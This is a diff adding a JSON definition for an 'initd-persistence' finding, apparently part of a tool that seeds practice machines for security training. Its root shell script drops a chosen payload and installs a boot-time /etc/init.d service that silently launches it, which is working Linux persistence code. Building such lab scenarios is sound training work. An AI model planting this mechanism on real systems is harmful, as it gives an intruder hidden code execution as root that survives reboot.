@@ -1,0 +1,10 @@
+{
+  "name": "initd-persistence",
+  "description": "Practice-box persistence finding: drops a legacy SysV /etc/init.d script whose start action launches a payload, and registers it for boot with update-rc.d. Does NOT start it now -- it comes alive at next boot (or when the rcs are invoked manually). Vars: SCRIPT_NAME (required, basename inside /etc/init.d), PAYLOAD_PATH (required), PAYLOAD_BODY (optional single sh line), DESCRIPTION (optional).",
+  "platform": "linux",
+  "category": "misconfiguration",
+  "type": "command",
+  "run_as": "root",
+  "depends_on": [],
+  "script": "#!/bin/sh\nset -eu\n\n\n: \"${SCRIPT_NAME:?SCRIPT_NAME is required}\"\n: \"${PAYLOAD_PATH:?PAYLOAD_PATH is required}\"\n\ninstall -d -m 0755 \"$(dirname -- \"$PAYLOAD_PATH\")\"\nprintf '#!/bin/sh\\n%s\\n' \"${PAYLOAD_BODY-}\" > \"$PAYLOAD_PATH\"\nchmod 0755 \"$PAYLOAD_PATH\"\n\n{\n    printf '%s\\n' '#!/bin/sh'\n    printf '%s\\n' '### BEGIN INIT INFO'\n    printf '# Provides:          %s\\n' \"$SCRIPT_NAME\"\n    printf '%s\\n' '# Required-Start:    $local_fs $network'\n    printf '%s\\n' '# Required-Stop:     $local_fs'\n    printf '%s\\n' '# Default-Start:     2 3 4 5'\n    printf '%s\\n' '# Default-Stop:      0 1 6'\n    printf '# Short-Description: %s\\n' \"${DESCRIPTION:-Legacy init script}\"\n    printf '%s\\n' '### END INIT INFO'\n    printf '\\n%s\\n' 'case \"$1\" in'\n    printf '%s\\n' '  start)'\n    printf '    setsid %s >/dev/null 2>&1 &\\n' \"$PAYLOAD_PATH\"\n    printf '%s\\n' '    ;;'\n    printf '%s\\n' '  stop|restart|force-reload|status)'\n    printf '%s\\n' '    ;;'\n    printf '%s\\n' 'esac'\n    printf '%s\\n' 'exit 0'\n} > \"/etc/init.d/$SCRIPT_NAME\"\nchmod 0755 \"/etc/init.d/$SCRIPT_NAME\"\n\nif command -v update-rc.d >/dev/null 2>&1; then\n    update-rc.d \"$SCRIPT_NAME\" defaults >/dev/null 2>&1 || :\nfi\n"
+}
